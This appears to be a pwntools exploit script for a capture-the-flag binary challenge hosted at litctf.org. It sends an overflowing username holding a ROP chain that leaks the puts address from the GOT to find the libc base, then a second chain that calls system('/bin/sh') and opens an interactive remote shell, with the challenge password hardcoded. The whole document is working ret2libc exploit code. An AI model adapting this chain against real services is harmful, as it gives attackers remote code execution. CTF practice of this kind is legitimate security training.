#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './main')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.arch = 'amd64'
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc litctf.org 31779'.split()
libc = exe.libc
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    libc = ELF('')
    ld = ELF('')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


def extract_leak(recv):
    '''Extract the leaked address from the received data.'''
    try:
        leak = list(map(lambda x: int(x,16), recv.split(b'|')[1:]))
        return leak
    except (IndexError, ValueError):
        log.error("Failed to extract leak from: {}".format(recv))
        return None
    

def addrx(func, x):
    '''Show func in hex'''
    log.info(f'{func}: {x}')


gdbscript = '''
continue
'''.format(**locals())

p = start()
pop_rdi = 0x00401323

# leak libc
user = flat(b'LITCTF\0',
            b'd' * 33, 
            pop_rdi,
            exe.got.puts,
            exe.plt.puts,
            exe.sym.main)
password = b'd0nt_57r1ngs_m3_3b775884'

p.sendline(user)
p.sendline(password)
p.recvuntil(b'Goodbye')
puts_libc = int.from_bytes(p.recvlines(2)[-1], 'little')
log.info(f'puts@LIBC: {hex(puts_libc)}')

# rop to binsh
libc.address = puts_libc - libc.sym.puts
binsh = next(libc.search(b'/bin/sh'))
log.info(f'binsh: {hex(binsh)}')

user = flat(b'LITCTF\0',
            b'a' * 33, 
            0x0040101a,
            pop_rdi,
            binsh,
            libc.sym.system,
            exe.sym.main)

p.sendline(user)
p.sendline(password)

p.interactive()